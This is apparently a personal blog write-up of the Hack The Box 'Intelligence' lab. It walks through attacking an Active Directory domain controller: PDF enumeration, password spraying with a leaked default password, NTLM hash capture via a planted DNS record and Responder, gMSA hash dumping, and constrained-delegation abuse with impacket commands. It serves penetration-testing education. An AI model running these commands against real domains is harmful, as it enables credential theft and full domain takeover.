---
layout: post
title:  "HTB Writeup [Windows - Medium] - Intelligence"
---

![Search](/assets/Intelligence/Intelligence.png)

### Summary
- A **Windows Domain Controller** that's hosting a static website on port 80.
- *While browsing the site,* we notice two links to **PDF** files that exist on a web directory for documents.
- *When checking the naming of the* **PDF** *files,* we notice a date-based scheme. So, we make a list of file names to look for other documents.
- We find a lot of documents containing dummy text. Except for two which included information about a **default password** and about administrative activity going on as well as some hardening.
- We also get a list of usernames when inspecting the metadata of the files. We use those to spray the domain users which results in our first set of credentials (`Tiffany.Molina`).
- *While checking Tiffany's* **SMB** *share access,* we come across a **PowerShell** script on the **"IT"** share that routinely queries **DNS** for record names starting with **"web"** and issues **authenticated** web requests to them.
- *Knowing this information,* we use a tool called `dnstool.py` from the **Krbrelayx** toolkit to add a record that starts with **"web"** and points to our Kali machine's IP address.
- *Having fired our* `responder` *to capture the* **HTTP** *request,* we wait for a couple of minutes and get the hash of a user called `ted.graves` who was running the script.
- *After running a* `bloodhound` *collection and viewing exploit paths from the users we own,* we find that **Ted** can read the **gMSA** password of `SVC_INT` which has **constrained delegation** on the Domain Controller.
- We use the `gMSADumper` python tool to get the **NTLM hash** of `SVC_INT` and use it to request a **silver ticket** impersonating the `Administrator` for a full domain takeover.

---

### Nmap
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-30 20:31:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
51310/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
|   date: 2022-06-30T20:31:57
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
```
*Viewing the port scan results,* we notice:

1. Standard Domain Controller ports: 53, 88, 389 & 445
2. **WinRM** on port 5985 which is nice for shell access
3. **IIS 10** on Port 80 that we should take a look at
4. *On the last line,* the **Clock Skew** between our host and the DC is 7 hours (which is something we must take care of to make sure anything **Kerberos-related** works well)

### The Website
![website-homepage](/assets/Intelligence/website-homepage.jpg)

checking the website's home page doesn't show anything special. Except for this:

![document-links](/assets/Intelligence/document-links.jpg)

*Upon clicking any of those links,* we get directed to a **"documents"** directory.

The content is some filler text. But we notice the naming of the documents is based on dates.

![document-naming](/assets/Intelligence/document-naming.jpg)

This is interesting because:

- we want to see if there were *other documents*
- *And if there were,* we want to check their **content** as well as their **metadata**

we might get information we could use.

### Searching Documents
We're going to create a script that generates a list of **PDF** file names following the scheme we found.

We'll make the script generate dates between 2018 to 2022. That's 2 years before and after the date of the found documents.

**Note:** This date range can take some time in the upcoming step. You can change it to be 2020 to 2021 if you just want to skip right to the solution. I'm only showing this because that's what I did on my actual run :)

*Since I am most comfortable with* **PowerShell** *and since it also runs on* **Linux**, I'm going to be using it.

Here's the script:

```
foreach($year in (2018 .. 2022)){
	foreach($month in (1 .. 12)){
	        if ($month -lt 10){$month = "0$month"}   # if the month's number is less than 10, put a zero before it
	        foreach($day in (1..31)){
	                if($day -lt 10){$day = "0$day"}  # if the day's number is less than 10, put a zero before it

	                "$year-$month-$day-upload.pdf" >> pdf_name_list.txt # output the generated name into a text file
	        }
	}
}
```

Which works like a charm :D

![pdf-name-generation](/assets/Intelligence/pdf-name-generation.jpg)

We create a specific folder for the **PDF**s and then write a quick **bash** loop to download every document it can find. we use `wget` with the `-q` flag to make it go quietly.

```
for doc in $(cat pdf_name_list.txt); do wget -q "http://10.10.10.248/documents/$doc"; done
```

![a-lot-of-pdfs](/assets/Intelligence/a-lot-of-pdfs.jpg)

The result is a large list of **PDF**s (99) from that process.

We wanted to find a tool to get us their content in text if possible. So we **Googled** for it:

![searching-for-pdf2text](/assets/Intelligence/searching-for-pdf2text.jpg)

![pdf2text-instructions](/assets/Intelligence/pdf2text-instructions.jpg)

*After installing the package,* We're going to use another **bash** script to create the converted text files.

```
for pdf in $(ls *.pdf); do pdftotext $pdf; done
```

We end up with 99 text files that we need to browse through :D

Time for another script xD

```
for text in $(ls *.txt); do echo $text; echo '---------------------'; cat $text; echo 'press any key to continue'; read; done
```

This displays the document names and allows you to browse each.

We find one interesting document: `2020-06-07-upload.txt`

![second_note](/assets/Intelligence/second_note.jpg)

Which talks about changing the default password: **"NewIntelligenceCorpUser9876"** for new users after logging in.

*If one of the users still has this password*, this could be our way of gaining access.

We also find another document: `2020-12-30-upload.txt`

![first_note](/assets/Intelligence/first_note.jpg)

It talks about a user `ted` (*who's probably in IT*) developing a **script** to notify people if a web server goes down.

And it also mentions **"locking down service accounts"** which hints at a **possible security concern** in that area.

### Interesting Information in Metadata
Now we need a list of usernames..

*With all those* **PDF**s *lying around,* we're tempted to look for information in **metadata.**

Our tool of choice is `exiftool`

We do a quick sample test on one of the documents:

![creator-metada](/assets/Intelligence/creator-metada.jpg)

We find that there's a **Creator** field with a possible username in it.

We use the tool with the `-creator` flag to only extract that field.

We couple this with some Shell Fu to create a user list:

```
for pdf in $(ls *.pdf); do exiftool -creator $pdf | awk -F ': ' '{print $2}'; done | sort -u > userlist.txt
```

![exiftool-userlist](/assets/Intelligence/exiftool-userlist.jpg)

Clean! :D

We then validate those usernames using [`kerbrute`](https://github.com/ropnop/kerbrute)

![kerbrute-userenum](/assets/Intelligence/kerbrute-userenum.jpg)

All 30 users were valid.

*Before spraying them with the default password,* we gotta sync our time with the **Domain Controller** since we're going to be doing **Kerberos authentication**.

A tool that automates that is `ntpdate`. But you have to disable the **Automatic Time Feature** in kali first using `timedatectl set-ntp off`

We do this and we're now in sync with the **DC** :]

![remove-clock-skew](/assets/Intelligence/remove-clock-skew.jpg)

![got-tiffany](/assets/Intelligence/got-tiffany.jpg)

Tiffany hadn't changed the default password. Lucky for us :D

### Exploiting the Vulnerable Script
*When checking the readable* **SMB** *shares as Tiffany,* we find that she can read a certain share: **IT**

![smb-shares-tiffany](/assets/Intelligence/smb-shares-tiffany.jpg)

We connect to it using `smbclient` and find the script that the previous note was talking about:

![script](/assets/Intelligence/script.jpg)

When checking its content:

```
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
	try {
		$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
		if(.StatusCode -ne 200) {
			Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
		}
	}
	catch {}
}
```

We can see that the script:
- Runs every 5 minutes
```
# Check web server status. Scheduled to run every 5min
```
- Looks for **DNS** records that start with **"web"**
```
Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*"
```
- Uses the credentials of the user running the script to issue web requests for every record match
```
Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
```

*In order to exploit this,* we need to:
1. Find a way to put up a **DNS** record that points to our attacker machine
2. Start a web server that can capture the **NTLM authentication** sent with the request

The answers for both those challenges is [dnstool.py](/assets/Intelligence/https://github.com/dirkjanm/krbrelayx) from the **krbrelayx** toolkit and [responder](https://github.com/SpiderLabs/Responder)

**`dnstool.py`** lets us set a **DNS** record if we have valid domain credentials.

We check its help and upload a record that points to our **Kali**

![dnstool-usage](/assets/Intelligence/dnstool-usage.jpg)

**`responder`** starts a *specially-setup* HTTP server that will capture the **NTLMv2** hash of the incoming request.

We will start it specifying our **VPN** tunnel interface: `responder -I tun0`

*After a few minutes,* we get an **NTLMv2** hash for the `Ted.Graves` user.

![captured-hash](/assets/Intelligence/captured-hash.jpg)

We could successfully crack it using `john`

![teddys-hash-cracked](/assets/Intelligence/teddys-hash-cracked.jpg)

### Bloodhound and the Path to Domain Admin
*After running the* **Bloodhound** *python Ingestor* [`Bloodhound.py`](/assets/Intelligence/https://github.com/fox-it/BloodHound.py), we mark our user `Ted.Graves` as owned.

We see a **clear exploit path** to **Domain Admin** when we view the results of the `Shortest Path from Owned Principals` built-in query:

![bloodhound-path-to-da](/assets/Intelligence/bloodhound-path-to-da.jpg)

1. **Ted** can read the password for `SVC_INT$`
2. `SVC_INT$` has **Constrained Delegation** over the Domain Controller (which we will talk about in the next section).

Let's first get the **NTLM** hash for the `SVC_INT$` group-managed service account.

we can do so using [`gMSADumper`](/assets/Intelligence/https://github.com/micahvandeusen/gMSADumper)

![gMSADumped](/assets/Intelligence/gMSADumped.jpg)

We're now good for the next step.

### Abusing Constrained Delegation
*In our case,* `SVC_INT$` is allowed delegation to the Domain Controller.

This means that it can **impersonate any user** (even Administrators) when interacting with the DC as the **WWW** service.

We know so by inspecting the account on `bloodhound`

![allowed-to-delegate](/assets/Intelligence/allowed-to-delegate.jpg)

*However, because the* **service portion** *in the granted* **service ticket** *is* **unprotected**, we may alter it for **any service** we want.

**For example:** we can motidy the received ticket to be for the **LDAP** service and be granted **DCSync** rights.

It was all mentioned on the **Bloodhound** help

![allowed-to-delegate-bh-help](/assets/Intelligence/allowed-to-delegate-bh-help.jpg)

Let's go ahead and exploit this! :D

We will first request the ticket using [**impacket**](https://github.com/SecureAuthCorp/impacket)'s `getST.py` script

```
getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
```

![getting-admin-ticket](/assets/Intelligence/getting-admin-ticket.jpg)

The ticket is now saved to disk. We're going to export it to our environment and use it to own the box:

```
export KRB5CCNAME=<path/to/ticket>
psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
```

![box-owned](/assets/Intelligence/box-owned.jpg)

Pretty sweet :D